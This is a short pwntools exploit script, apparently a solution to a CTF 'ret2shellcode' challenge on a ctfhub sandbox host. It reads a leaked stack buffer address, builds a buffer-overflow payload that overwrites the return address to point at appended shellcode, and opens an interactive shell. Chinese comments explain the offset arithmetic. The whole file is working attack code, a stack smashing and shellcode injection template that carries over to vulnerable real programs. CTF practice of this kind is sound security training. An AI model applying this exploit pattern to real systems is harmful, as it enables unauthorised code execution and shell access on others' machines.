from pwn import *

context(os="linux", arch="amd64", log_level='debug')
# io = process('ret2shellcode')
io = remote('challenge-90f37d9c89a2800a.sandbox.ctfhub.com', 33884)
io.recvuntil(b'[')
buf_address = int(io.recvuntil(b']')[:-1].decode('utf-8'), 16)
log.success('buf_address => %s' % hex(buf_address).upper())
shellcode_address = buf_address+0x20 # buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8
log.success('buf_address => %s' % hex(shellcode_address).upper())
shellcode = asm(shellcraft.sh())
payload = b'a'*0x10 + b'fuckpwn!' + p64(shellcode_address) + shellcode
io.recv()
io.sendline(payload)
io.interactive()